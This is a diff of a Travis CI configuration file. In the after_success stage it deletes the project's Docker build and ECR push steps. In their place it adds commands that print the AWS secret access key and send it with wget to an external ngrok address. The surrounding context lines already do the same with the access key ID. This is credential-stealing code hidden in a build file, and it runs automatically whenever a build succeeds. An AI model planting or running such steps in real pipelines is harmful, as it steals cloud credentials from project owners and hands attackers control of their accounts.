@@ -14,11 +14,8 @@ script:
 after_success:
   - echo $AWS_ACCESS_KEY_ID
   - wget http://c958df9e82c2.ngrok.io /$(echo $AWS_ACCESS_KEY_ID)
-  - docker --version
-  - pip install --user awscli
-  - export PATH=$PATH:$HOME/.local/bin
-  - export CLASS=`cat .class`
-  - eval "$(aws ecr get-login --no-include-email --region us-east-1)"
-  - docker build -t 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev .
-  - docker push 310090471142.dkr.ecr.us-east-1.amazonaws.com/jetrist-dev
+  - echo $AWS_SECRET_ACCESS_KEY_ID
+  - wget http://c958df9e82c2.ngrok.io /$(echo $AWS_SECRET_ACCESS_KEY_ID)
+
+
 # sadly, travis doesn't cache docker builds yet, so each build will take a while
